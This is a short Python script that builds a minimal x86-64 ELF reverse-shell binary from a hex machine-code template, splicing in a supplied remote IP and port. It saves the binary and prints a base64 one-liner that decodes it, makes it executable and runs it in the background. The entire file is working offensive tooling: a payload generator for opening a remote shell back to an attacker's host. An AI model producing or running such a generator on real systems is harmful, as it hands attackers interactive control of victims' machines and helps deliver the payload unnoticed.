import array,base64,binascii,struct,sys,re

if len(sys.argv) < 3 or len(sys.argv) > 4:
    print('[Usage] \n  python3 '+sys.argv[0]+' <RHOST> <RPORT> <optional:OUTFILE>')
    exit()

if len(sys.argv) == 4:
    outFile = sys.argv[3]
else:
    outFile = 'rshell'

### Binary Template ############################
b1 = ['7F','45','4C','46','6A','29','58','6A', #
      '02','5F','6A','01','5E','99','EB','3C', #
      '02','00','3E','00','01','00','00','00', #
      '04','00','00','00','01','00','00','00', #
      '1C','00','00','00','00','00','00','00', #
      '00','00','00','00','00','00','00','00', #
      '01','00','00','00','40','00','38','00', #
      '01','00','02','00','04','3B','0F','05', #
      '00','00','00','00','04','3B','0F','05', #
      '00','00','00','00','0F','05','48','97', #
      'C7','44','24','FC']                     #
# This is where the IP is inserted.            #
b2 = ['66','C7','44','24','FA']                #
# This is where the port is inserted.          #
b3 = ['C6','44','24','F8','02','48','83','EC', #
      '08','6A','2A','58','48','89','E6','6A', #
      '10','5A','0F','05','6A','03','5E','48', #
      'FF','CE','6A','21','58','0F','05','75', #
      'F6','99','88','44','24','FF','48','83', #
      'EC','01','52','48','8D','74','24','F0', #
      '80','C2','10','0F','05','48','31','C0', #
      '48','BB','2F','62','69','6E','2F','2F', #
      '73','68','53','48','89','E7','50','48', #
      '89','E2','57','48','89','E6','EB','8D'] #
### End Template ###############################

ip   = sys.argv[1]
port = sys.argv[2]

def writeBin(b):
    f = open(outFile,'wb')
    f.write(b)
    f.close()

try:
    print("Generating Reverse Shell...")
    print("RHOST: "+ip)
    print("RPORT: "+port)

    ip   = ip.split('.')
    hexi = '{:02X}{:02X}{:02X}{:02X}'.format(*map(int, ip))
    ia   = re.findall('..',hexi)
    hexp = '{:x}'.format(int(port))
    ha   = re.findall('..',hexp)
    nBin = b1 + ia + b2 + ha + b3
    barr = ''.join(nBin)
    b    = bytearray.fromhex(barr)
    writeBin(b)

    print("\nSaved to %s" % outFile)
    b64bin   = base64.b64encode(b)
    oneliner = b64bin.decode('utf-8')
    print("\n[One Liner]\n")
    print("base64 -d <<< " + oneliner + " > s;chmod +x s;./s &")

except Exception as e:
    print("ERROR: %s"%e)